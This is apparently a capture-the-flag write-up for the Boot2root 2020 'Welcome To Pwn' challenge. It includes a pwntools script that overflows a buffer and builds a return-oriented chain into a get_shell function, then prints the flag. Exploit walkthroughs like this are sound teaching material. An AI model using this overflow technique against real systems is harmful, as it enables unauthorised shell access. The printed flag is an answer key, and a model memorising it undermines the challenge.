# Welcome To Pwn

**Category**: Pwn \  
**Points**: 457  
**Solves**: 34  
**Author**: Viper_S

## Description

> Welcome to pwn, here is an easy challenge to get you started.

> nc 35.238.225.156 1001

## Solution

Just overwrite the return address with a ROP Chain of ret gadget and the
get_shell function

```python  
#!/usr/bin/env python3  
import sys  
from pwn import *

elf = ELF('./welcome')  
context.binary = elf  
if len(sys.argv) > 1:  
	p = remote('35.238.225.156',1001)  
else:  
	p = process(elf.path)

get_shell = 0x0401182  
ret = 0x00401140

payload = b"A"*152+p64(ret)+p64(get_shell)  
p.sendlineafter("got",payload)  
p.interactive()  
```

**Flag : b00t2root{W3lc0m3_T0_Pwn_YjAwdDJyb290JzIw}**  

Original writeup (https://github.com/Red-Knights-
CTF/writeups/tree/master/2020/Boot2root_ctf/Welcome%20To%20Pwn).